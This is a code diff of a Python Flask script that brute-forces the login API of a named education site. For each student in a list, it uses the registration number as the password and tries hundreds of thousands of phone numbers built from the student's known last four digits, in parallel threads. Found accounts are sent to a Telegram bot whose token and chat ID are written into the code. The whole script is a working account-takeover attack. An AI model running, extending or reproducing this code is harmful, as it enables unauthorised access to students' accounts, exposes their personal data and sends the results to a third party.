@@ -2,22 +2,18 @@ import requests
 import time
 import os
 import threading
-import traceback
-from concurrent.futures import ThreadPoolExecutor
+import sys
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from flask import Flask
 
 app = Flask(__name__)
 
-# ==========================================
-# YAHAN APNI TELEGRAM DETAILS DAALO
-# ==========================================
-BOT_TOKEN = "8845557626:AAHyHv_BNpKS8OG-YVphwMSthEorIncWtmM"
-CHAT_ID = "1634075045"
-# ==========================================
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8845557626:AAHyHv_BNpKS8OG-YVphwMSthEorIncWtmM")
+CHAT_ID = os.environ.get("CHAT_ID", "1634075045")
 
 API_URL = "https://www.eduintern.in/api/auth/login"
 FILE_NAME = "students.txt" 
-THREADS = 40 
+THREADS = 20 
 
 HEADERS = {
     "Accept": "application/json, text/plain, */*",
@@ -31,84 +27,137 @@ def send_telegram_msg(text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {"chat_id": CHAT_ID, "text": text}
     try:
-        res = requests.post(url, json=payload)
-        if res.status_code != 200:
-            print(f"Telegram Error: {res.text}")
-    except Exception as e:
-        print("Telegram Exception:", e)
-
-def check_number(reg_no, last4, prefix6):
-    phone = prefix6 + last4
-    payload = {
-        "phone": phone,
-        "password": reg_no
-    }
-    
-    try:
-        r = requests.post(API_URL, json=payload, headers=HEADERS, timeout=10)
-        if r.status_code == 200:
-            return phone
-        elif r.status_code == 401:
-            return False
-        elif r.status_code == 429:
-            time.sleep(2)
-            return False
+        requests.post(url, json=payload, timeout=5)
     except Exception:
         pass
-    return False
+
+def check(phone, password):
+    try:
+        r = requests.post(API_URL, json={"phone": phone, "password": password}, headers=HEADERS, timeout=8)
+        data = r.json() if r.text else {}
+        
+        # Tera wala success logic
+        success = "student" in data or "user" in data or ("token" in data and "name" in data)
+        
+        return {
+            "phone": phone,
+            "status_code": r.status_code,
+            "response": data,
+            "success": success
+        }
+    except requests.exceptions.Timeout:
+        return {"phone": phone, "status_code": "TIMEOUT", "success": False}
+    except Exception as e:
+        return {"phone": phone, "status_code": "ERROR", "response": str(e), "success": False}
 
 def process_student(index, reg_no, last4):
-    print(f"\n[{index}] Searching number ending with {last4} for Reg: {reg_no}...", flush=True)
+    print(f"\n{'='*70}", flush=True)
+    print(f"[{index}] TARGET START: Reg No {reg_no} (Ending: {last4})", flush=True)
+    print(f"{'='*70}\n", flush=True)
     
     valid_first_digits = ['6', '7', '8', '9']
     prefixes = [f"{first_digit}{i:05d}" for first_digit in valid_first_digits for i in range(100000)]
+    total = len(prefixes)
     
-    found_phone = None
+    found = None
+    checked = 0
+    start_time = time.time()
+    error_count = 0
+    success_count = 0
+    fail_count = 0
     
-    with ThreadPoolExecutor(max_workers=THREADS) as executor:
-        for prefix in prefixes:
-            future = executor.submit(check_number, reg_no, last4, prefix)
-            result = future.result()
-            if result:
-                found_phone = result
-                break
-    
-    if found_phone:
-        msg = f"[{index}] {reg_no}    {found_phone}  sus"
-        print(msg, flush=True)
-        send_telegram_msg(msg)
-    else:
-        msg = f"[{index}] {reg_no}    no match number found"
-        print(msg, flush=True)
-        send_telegram_msg(msg)
+    def process_phone(prefix6):
+        nonlocal found
+        if found: return None
+        phone = prefix6 + last4
+        
+        # Retry system (Tera wala)
+        attempt = 0
+        while True:
+            res = check(phone, reg_no)
+            if res["success"]:
+                return res
+            if res["status_code"] == 401:
+                return res
+            if res["status_code"] in ["ERROR", "TIMEOUT"]:
+                attempt += 1
+                if attempt <= 3: continue
+                return res
+            return res
+
+    with ThreadPoolExecutor(max_workers=THREADS) as ex:
+        futures = [ex.submit(process_phone, prefix) for prefix in prefixes]
+        for future in as_completed(futures):
+            checked += 1
+            res = future.result()
             
+            if res and res["success"]:
+                found = res
+                print(f"\n\n[+] ✅ ACCOUNT FOUND! [+]\n", flush=True)
+                print(f"📞 Phone  : {res['phone']}", flush=True)
+                print(f"📄 Response: {res['response']}", flush=True)
+                
+                msg = f"[{index}] {reg_no}    {res['phone']}  sus"
+                send_telegram_msg(msg)
+                break
+            
+            # Exact Style Live Logs
+            if res:
+                if res["status_code"] == "ERROR":
+                    error_count += 1
+                    print(f"[{checked}/{total}] 📞 {res['phone']} → Status: ERROR", flush=True)
+                elif res["status_code"] == 401:
+                    fail_count += 1
+                    print(f"[{checked}/{total}] 📞 {res['phone']} → Status: 401", flush=True)
+                elif res["status_code"] == 200:
+                    success_count += 1
+                    print(f"[{checked}/{total}] 📞 {res['phone']} → Status: 200 (No user data)", flush=True)
+                elif res["status_code"] == "TIMEOUT":
+                    error_count += 1
+                    print(f"[{checked}/{total}] 📞 {res['phone']} → Status: TIMEOUT", flush=True)
+                else:
+                    print(f"[{checked}/{total}] 📞 {res['phone']} → Status: {res['status_code']}", flush=True)
+
+    elapsed = time.time() - start_time
+    print("\n" + "=" * 70, flush=True)
+    print(f"[+] SCAN SUMMARY FOR {reg_no}", flush=True)
+    print("=" * 70, flush=True)
+    
+    if found:
+        print(f"[+] ACCOUNT FOUND: {found['phone']}", flush=True)
+    else:
+        print("[!] NO ACCOUNT FOUND!", flush=True)
+        msg = f"[{index}] {reg_no}    no match number found"
+        send_telegram_msg(msg)
+        
+    print(f"\n[+] Time: {elapsed:.2f}s", flush=True)
+    print(f"[+] Speed: {checked/elapsed:.1f}/sec", flush=True)
+    print(f"[+] Errors: {error_count}", flush=True)
+    print(f"[+] 401 Failed: {fail_count}", flush=True)
+    print(f"[+] 200 Success (No Data): {success_count}", flush=True)
+    print("=" * 70 + "\n", flush=True)
+    
     send_telegram_msg("--------------------------------\nNext target scan ho raha hai...")
 
 def run_hunter():
     time.sleep(5)
     try:
-        # Render me path dhundhne ke liye check
-        print(f"Looking for file at: {os.path.abspath(FILE_NAME)}", flush=True)
-        
         with open(FILE_NAME, 'r', encoding='utf-8') as f:
             lines = [line.strip() for line in f.readlines() if line.strip()]
             
         print(f"Total {len(lines)} lines mili. Kaam shuru...", flush=True)
-        send_telegram_msg(f"🚀 Script start ho gayi! Total {len(lines)} students process honge.")
+        send_telegram_msg(f"🚀 Script start! Total {len(lines)} students process honge.")
         
         for i, line in enumerate(lines, start=1):
             parts = line.split()
             if len(parts) >= 2:
-                reg_no = parts[0]
-                last4 = parts[1]
-                process_student(i, reg_no, last4)
+                process_student(i, parts[0], parts[1])
                 
-        send_telegram_msg("✅ Saare students process ho gaye! File check kar le.")
+        send_telegram_msg("✅ Saare students process ho gaye!")
                 
     except Exception as e:
-        print("Error in run_hunter:", e, flush=True)
-        traceback.print_exc()
-        send_telegram_msg(f"❌ Error aaya: {str(e)}")
+        print("Error:", e, flush=True)
+        send_telegram_msg(f"❌ Error: {str(e)}")
 
 @app.route('/')
 def home():
